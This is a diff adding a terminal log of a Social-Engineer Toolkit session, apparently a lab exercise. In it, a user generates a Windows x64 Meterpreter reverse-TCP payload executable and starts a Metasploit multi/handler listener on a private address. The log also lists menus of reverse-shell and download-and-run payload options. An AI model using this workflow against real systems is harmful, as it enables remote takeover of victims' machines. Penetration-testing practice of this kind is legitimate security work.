@@ -1,0 +1,127 @@
+
+                          .  ..
+                       MMMMMNMNMMMM=
+                   .DMM.           .MM$
+                 .MM.                 MM,.
+                 MN.                    MM.
+               .M.                       MM
+              .M   .....................  NM
+              MM   .8888888888888888888.   M7
+             .M    88888888888888888888.   ,M
+             MM       ..888.MMMMM    .     .M.
+             MM         888.MMMMMMMMMMM     M
+             MM         888.MMMMMMMMMMM.    M
+             MM         888.      NMMMM.   .M
+              M.        888.MMMMMMMMMMM.   ZM
+              NM.       888.MMMMMMMMMMM    M:
+              .M+      .....              MM.
+               .MM.                     .MD
+                 MM .                  .MM
+                  $MM                .MM.
+                    ,MM?          .MMM
+                       ,MMMMMMMMMMM
+                https://www.trustedsec.com
+
+[---]        The Social-Engineer Toolkit (SET)         [---]
+[---]        Created by: David Kennedy (ReL1K)         [---]
+                      Version: 8.0.3
+                    Codename: 'Maverick'
+[---]        Follow us on Twitter: @TrustedSec         [---]
+[---]        Follow me on Twitter: @HackingDave        [---]
+[---]       Homepage: https://www.trustedsec.com       [---]
+        Welcome to the Social-Engineer Toolkit (SET).
+         The one stop shop for all of your SE needs.
+
+   The Social-Engineer Toolkit is a product of TrustedSec.
+
+           Visit: https://www.trustedsec.com
+
+   It's easy to update using the PenTesters Framework! (PTF)
+Visit https://github.com/trustedsec/ptf to update all your tools!
+
+
+Can't get local object 'show_banner.<locals>.pull_version'
+ Select from the menu:
+
+   1) Spear-Phishing Attack Vectors
+   2) Website Attack Vectors
+   3) Infectious Media Generator
+   4) Create a Payload and Listener
+   5) Mass Mailer Attack
+   6) Arduino-Based Attack Vector
+   7) Wireless Access Point Attack Vector
+   8) QRCode Generator Attack Vector
+   9) Powershell Attack Vectors
+  10) Third Party Modules
+
+  99) Return back to the main menu.
+
+set> 4
+
+
+   1) Windows Shell Reverse_TCP               Spawn a command shell on victim and send back to attacker
+   2) Windows Reverse_TCP Meterpreter         Spawn a meterpreter shell on victim and send back to attacker
+   3) Windows Reverse_TCP VNC DLL             Spawn a VNC server on victim and send back to attacker
+   4) Windows Shell Reverse_TCP X64           Windows X64 Command Shell, Reverse TCP Inline
+   5) Windows Meterpreter Reverse_TCP X64     Connect back to the attacker (Windows x64), Meterpreter
+   6) Windows Meterpreter Egress Buster       Spawn a Meterpreter shell and find a port home via multiple ports
+   7) Windows Meterpreter Reverse HTTPS       Tunnel communication over HTTP using SSL and use Meterpreter
+   8) Windows Meterpreter Reverse DNS         Use a hostname instead of an IP address and use Reverse Meterpreter
+   9) Download/Run your Own Executable        Downloads an executable and runs it
+
+set:payloads>5
+set:payloads> IP address for the payload listener (LHOST): 192.168.0.102
+set:payloads> Enter the PORT for the reverse listener: 4444
+[*] Generating the payload.. please be patient.
+[*] Payload has been exported to the default SET directory located under: /Users/swadhakhatod/.set/payload.exe
+set:payloads> Do you want to start the payload and listener now? (yes/no): yes
+[*] Launching msfconsole, this could take a few to load. Be patient...
+This copy of metasploit-framework is more than two weeks old.
+ Consider running 'msfupdate' to update to the latest version.
+Metasploit tip: Writing a custom module? After editing your module, why not try 
+the reload command
+                                                  
+
+ ______________________________________________________________________________
+|                                                                              |
+|                          3Kom SuperHack II Logon                             |
+|______________________________________________________________________________|
+|                                                                              |
+|                                                                              |
+|                                                                              |
+|                 User Name:          [   security    ]                        |
+|                                                                              |
+|                 Password:           [               ]                        |
+|                                                                              |
+|                                                                              |
+|                                                                              |
+|                                   [ OK ]                                     |
+|______________________________________________________________________________|
+|                                                                              |
+|                                                       https://metasploit.com |
+|______________________________________________________________________________|
+
+
+       =[ metasploit v6.4.49-dev-300e99db0101791908b12a3b5033e3bdd6c093ef]
++ -- --=[ 2492 exploits - 1283 auxiliary - 431 post       ]
++ -- --=[ 1463 payloads - 49 encoders - 13 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+[*] Processing /Users/swadhakhatod/.set/meta_config for ERB directives.
+resource (/Users/swadhakhatod/.set/meta_config)> use multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+resource (/Users/swadhakhatod/.set/meta_config)> set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+resource (/Users/swadhakhatod/.set/meta_config)> set LHOST 192.168.0.102
+LHOST => 192.168.0.102
+resource (/Users/swadhakhatod/.set/meta_config)> set LPORT 4444
+LPORT => 4444
+resource (/Users/swadhakhatod/.set/meta_config)> set ExitOnSession false
+ExitOnSession => false
+resource (/Users/swadhakhatod/.set/meta_config)> exploit -j
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+[*] Started reverse TCP handler on 192.168.0.102:4444 
+msf6 exploit(multi/handler) > 
